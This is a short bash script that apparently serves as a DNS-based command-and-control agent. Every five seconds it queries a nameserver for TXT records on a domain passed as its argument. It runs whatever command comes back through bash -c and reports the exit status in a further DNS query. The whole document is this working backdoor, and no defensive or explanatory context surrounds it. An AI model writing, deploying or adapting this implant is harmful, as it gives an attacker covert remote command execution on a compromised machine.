#!/bin/bash

# This script checks for new commands from a c2 module running on the nameserver
# checks every 5 seconds and responds to the ns with the command output

origin=$(echo ".c2." "$1" | sed 's/ //g' | sed 's/\.\././g') 
uniqid=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 5 | head -n 1)

while true ; do 
	
	randprefix=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 10 | head -n 1)
	cmd=$(dig +short "$uniqid.$randprefix$origin" TXT | sed s/^\"// | sed s/\"$//)
	echo "Running $cmd"
	bash -c "$cmd"
	request="$?.$uniqid.$randprefix.ack$origin" 
	echo "Request: $request"
	dig "$request" TXT +short &> /dev/null

	sleep 5 
done

